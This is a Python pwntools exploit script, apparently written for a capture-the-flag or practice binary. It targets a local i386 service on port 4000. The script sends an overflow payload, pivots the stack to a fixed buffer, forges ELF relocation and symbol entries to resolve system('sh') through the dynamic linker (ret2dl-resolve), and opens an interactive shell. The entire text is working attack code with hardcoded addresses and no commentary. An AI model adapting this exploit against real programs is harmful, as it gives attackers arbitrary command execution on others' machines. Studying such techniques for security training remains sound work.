#!/usr/bin/env python

from pwn import *

context.arch='i386'

r = remote('127.0.0.1', 4000)

# partial ver
read = 0x8048310
memcpy = 0x8048320
plt0 = 0x8048300
pop3 = 0x80484f9
pop2 = 0x80484fa
pop1 = 0x80484fb

buf = 0x804a060
d = buf + 2048

dynamic = 0x08049f14
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
    plt0, d - relplt, 0xdeadbeef, d + 36, 
    )

data = flat(
    [buf, 0x07 | (((d+12-dynsym)/16)<<8)], 0, # d+12, Elf32_Rel
    [d+28-dynstr, 0, 0, 0x12],  # d+28, Elf32_Sym
    'system\x00\x00', # d+36
    'sh\x00'
    )

raw_input('@')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)

r.interactive()
